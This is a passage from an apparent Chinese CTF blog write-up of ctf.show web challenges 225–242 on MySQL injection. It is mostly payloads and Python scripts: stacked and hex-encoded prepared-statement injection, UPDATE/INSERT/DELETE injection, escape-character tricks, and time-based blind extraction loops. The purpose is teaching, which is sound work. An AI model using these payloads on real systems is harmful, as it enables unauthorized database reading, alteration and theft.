id=&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>如果是这样的话,我们就可以将这里的words替换成1919810931114514将flag替换成id从而实现获取数据.那么可以将1919810931114514改名为words,在这之前需要先将words改下名,改成别的如word1.将flag改成data.但是在1919810931114514并没有id这个列名,那么我们可以给他添加一组id.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not NULL auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure><p>接着才查询1</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151529964.png" alt="image-20220315152912904"></p><h3 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a>预处理语句</h3><p>用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SER @tn = &#x27;hahaha&#x27;; #存储表名</span><br><span class="line">SET @sql =concat(&#x27;select * from &#x27;,@tn);#存储sql语句</span><br><span class="line">PREPARE name from @sql; #预处理sql语句</span><br><span class="line">EXECUTE name; #执行预定义sql语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE sqla; #删除预定义sql</span><br></pre></td></tr></table></figure><p>本题即可利用char()函数将select的ascii码转换成select字符串,接着利用concat()函数进行拼接得到select查询语句从而绕过过滤.或者直接使用concat()函数拼接select来绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char(115,101,108,101,99,116)等价于select&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;SET @sqli=concat(char(115,101,108,101,99,116),&#x27;</span><span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`<span class="string">&#x27;);PREPARE st from @sqli;EXECUTE st;#</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;PREPARE st from concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect<span class="string">&#x27;, &#x27;</span> <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>` <span class="string">&#x27;);EXECUTE st;#</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;SET @sqli=concat(char(115,101,108,101,99,116),&#x27; database()&#x27;);PREPARE st from @sqli;EXECUTE st;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;SET @sqli=concat(char(115,101,108,101,99,116),&#x27; database()&#x27;);PREPARE st from @sqli;EXECUTE st;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><h1 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h1><h2 id="16进制预处理堆叠注入"><a href="#16进制预处理堆叠注入" class="headerlink" title="16进制预处理堆叠注入"></a>16进制预处理堆叠注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409101024519.png" alt="image-20220409101024519"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p>记得十六进制前面加0x哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409101420720.png" alt="image-20220409101420720"></p><p>字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c6167617327;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p>数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><h1 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409101938137.png" alt="image-20220409101938137"></p><p>这道题考点其实是查看MySQL的存储过程.看看网上这篇文章<a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL——查看存储过程和函数</a>.我们去查information_schema.routines表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409102115511.png" alt="image-20220409102115511"></p><h1 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h1><p>和226差不多</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409102337468.png" alt="image-20220409102337468"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c61676173616127;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c65637420666c6167617362612066726f6d2063746673685f6f775f666c616761736161;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><h1 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409102757765.png" alt="image-20220409102757765"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27666c616727;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c65637420666c6167617362612066726f6d20666c6167;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><h1 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103050744.png" alt="image-20220409103050744"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d27666c6167616162627827;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;prepare s from 0x73656c65637420666c616761736261732066726f6d20666c61676161626278;execute s;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><h1 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h1><h2 id="updata注入"><a href="#updata注入" class="headerlink" title="updata注入"></a>updata注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103315126.png" alt="image-20220409103315126"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update ctfshow_user set pass = &#x27;&#123;$password&#125;&#x27; where username = &#x27;&#123;$username&#125;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103537495.png" alt="image-20220409103537495"></p><p>还是这里找发送参数</p><p>简单闭合一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update ctfshow_user set pass = &#x27;1&#x27;,username=user() where 1=1#&#x27; where username = &#x27;1&#x27;;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103848475.png" alt="image-20220409103848475"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">password=1&#x27;,username=user()#&amp;username=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103833385.png" alt="image-20220409103833385"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">password=1&#x27;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) #&amp;username=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">password=1&#x27;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flaga&#x27;)#&amp;username=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">password=1&#x27;,username=(select flagas from flaga)#&amp;username=1</span><br><span class="line">password=1&#x27;,username=(select a from (select group_concat(flagas)a from flaga) 1) ;#&amp;username=1</span><br></pre></td></tr></table></figure><h1 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409104334331.png" alt="image-20220409104334331"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">password=1&#x27;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;username=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409105435149.png" alt="image-20220409105435149"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">password=1&#x27;),username=(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flagaa&#x27;)#&amp;username=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=1&#x27;),username=(select flagass from flagaa)#&amp;username=1</span><br><span class="line">password=1&#x27;),username=(select a from (select group_concat(flagas)a from flaga) 111) ;#&amp;username=1</span><br></pre></td></tr></table></figure><h1 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h1><h2 id="updata盲注"><a href="#updata盲注" class="headerlink" title="updata盲注"></a>updata盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409105751661.png" alt="image-20220409105751661"></p><p>盲注</p><p>测试</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://ad2cbb74-6e31-4f3d-bffc-6d989a5760f7.challenge.ctf.show/api/&quot;</span></span><br><span class="line">payload = <span class="string">&quot;length(database())=0&quot;</span> <span class="comment">#没延迟</span></span><br><span class="line">payload = <span class="string">&quot;length(database())&gt;0&quot;</span> <span class="comment">#延迟</span></span><br><span class="line">date = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;1&#x27; or if(<span class="subst">&#123;payload&#125;</span>,sleep(0.05),1) #&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.post(url, data=date, timeout=<span class="number">0.9</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;没延迟&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;延迟&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1&amp;limit=10&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查表名</span></span><br><span class="line">        <span class="comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;flag233333&#x27; limit 1,1&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flagass233 from flag233333&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;1&#x27; or if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.05),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;4&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">0.9</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h1><h2 id="逃逸字符"><a href="#逃逸字符" class="headerlink" title="\逃逸字符"></a>\逃逸字符</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409115745252.png" alt="image-20220409115745252"></p><p>单引号被过滤了,但是可以通过 \ 逃逸字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;update ctfshow_user set pass = &#x27;&#123;$password&#125;&#x27; where username = &#x27;&#123;$username&#125;&#x27;;&quot;;</span><br></pre></td></tr></table></figure><p>就像这样,我们给pass传入一个 \ 那么这个’就被转义了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;$username&#x27;;&quot;;</span><br></pre></td></tr></table></figure><p>也就是这个才是’\‘ where username &#x3D; ‘pass那么后面的username自然就受我们控制了,比如我们这样闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;,username=select database()#&#x27;;&quot;;</span><br></pre></td></tr></table></figure><p>,username&#x3D;select database()#这一部分就是我们传入的username的值</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409115907938.png" alt="image-20220409115907938"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409115915740.png" alt="image-20220409115915740"></p><p>传数据库名的时候记得用十六进制哦 ‘’ 被过滤了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#&amp;password=\</span><br></pre></td></tr></table></figure><h1 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h1><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120324788.png" alt="image-20220409120324788"></p><p><a href="https://www.jb51.net/article/134678.htm">概述MySQL统计信息</a>   <a href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysql之无列名注入</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&amp;password=\</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120619242.png" alt="image-20220409120611609"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120634772.png" alt="image-20220409120634772"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#&amp;password=\</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=,username=(select `2` from(select 1,2,3 union select * from flag23a1 limit 1,1)a)#&amp;password=\</span><br></pre></td></tr></table></figure><h1 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120851488.png" alt="image-20220409120851488"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&amp;password=\</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120950191.png" alt="image-20220409120950191"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120958493.png" alt="image-20220409120958493"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121038900.png" alt="image-20220409121038900"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121050832.png" alt="image-20220409121050832"></p><h1 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h1><h2 id="inster注入"><a href="#inster注入" class="headerlink" title="inster注入"></a>inster注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121236464.png" alt="image-20220409121236464"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=3&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121533936.png" alt="image-20220409121533936"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121540848.png" alt="image-20220409121540848"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=3&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;));-- A&amp;password=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=3&#x27;,(select flagass23s3 from flag));-- A&amp;password=1</span><br></pre></td></tr></table></figure><h1 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h1><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121935402.png" alt="image-20220409121935402"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=3&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409122028791.png" alt="image-20220409122028791"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409122041955.png" alt="image-20220409122041955"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=3&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flagb&#x27;)));#&amp;password=1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=3&#x27;,(select(flag)from(flagb)));#&amp;password=1</span><br></pre></td></tr></table></figure><h1 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h1><h2 id="过滤or-空格"><a href="#过滤or-空格" class="headerlink" title="过滤or 空格"></a>过滤or 空格</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409123445710.png" alt="image-20220409123445710"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409123642991.png" alt="image-20220409123642991"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409123657096.png" alt="image-20220409123657096"></p><p>不会查列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27;,(select(flag)from(flagbb)));#&amp;password=1</span><br></pre></td></tr></table></figure><h1 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409124924898.png" alt="image-20220409124924898"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d9a27e7b-ab91-4d9e-86c7-89a30a22acf3.challenge.ctf.show&quot;</span></span><br><span class="line">url_insert = url + <span class="string">&quot;/api/insert.php&quot;</span></span><br><span class="line">url_flag = url + <span class="string">&quot;/api/?page=1&amp;limit=1000&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 看命函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_str</span>():</span><br><span class="line">    sttr = <span class="string">&#x27;ab&#x27;</span></span><br><span class="line">    str_list = [random.choice(sttr) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">    random_str = <span class="string">&#x27;&#x27;</span>.join(str_list)</span><br><span class="line">    <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;1&#x27;,(select(flag)from(flag<span class="subst">&#123;generate_random_str()&#125;</span>)))#&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url_insert, data=data)</span><br><span class="line">    r2 = requests.get(url_flag)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> r2.text:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> r2.json()[<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span>  <span class="string">&quot;ctfshow&#123;&quot;</span> <span class="keyword">in</span> i[<span class="string">&#x27;pass&#x27;</span>]:</span><br><span class="line">                <span class="built_in">print</span>(i[<span class="string">&#x27;pass&#x27;</span>])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h1><h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409125442979.png" alt="image-20220409125442979"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:feng</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://224c4817-ece7-46e4-a9a5-185fdce4e641.chall.ctf.show:8080/api/delete.php&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">min</span>=<span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        j=<span class="built_in">min</span>+(<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span>==j:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j)==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload=&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.01),1)&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment">#payload=&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.01),1)&quot;.format(i,j)</span></span><br><span class="line">        payload=<span class="string">&quot;if(ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))&lt;&#123;&#125;,sleep(0.01),1)&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=requests.post(url=url,data=data,timeout=<span class="number">0.2</span>)</span><br><span class="line">            <span class="built_in">min</span>=j</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">max</span>=j</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">0.2</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h1><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409131541223.png" alt="image-20220409131541223"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT ... INTO OUTFILE &#x27;file_name&#x27;</span><br><span class="line">        [CHARACTER SET charset_name]</span><br><span class="line">        [export_options]</span><br><span class="line"></span><br><span class="line">export_options:</span><br><span class="line">    [&#123;FIELDS | COLUMNS&#125;</span><br><span class="line">        [TERMINATED BY &#x27;string&#x27;]//分隔符</span><br><span class="line">        [[OPTIONALLY] ENCLOSED BY &#x27;char&#x27;]</span><br><span class="line">        [ESCAPED BY &#x27;char&#x27;]</span><br><span class="line">    ]</span><br><span class="line">    [LINES</span><br><span class="line">        [STARTING BY &#x27;string&#x27;]</span><br><span class="line">        [TERMINATED BY &#x27;string&#x27;]</span><br><span class="line">    ]</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">“OPTION”参数为可选参数选项，其可能的取值有：</span><br><span 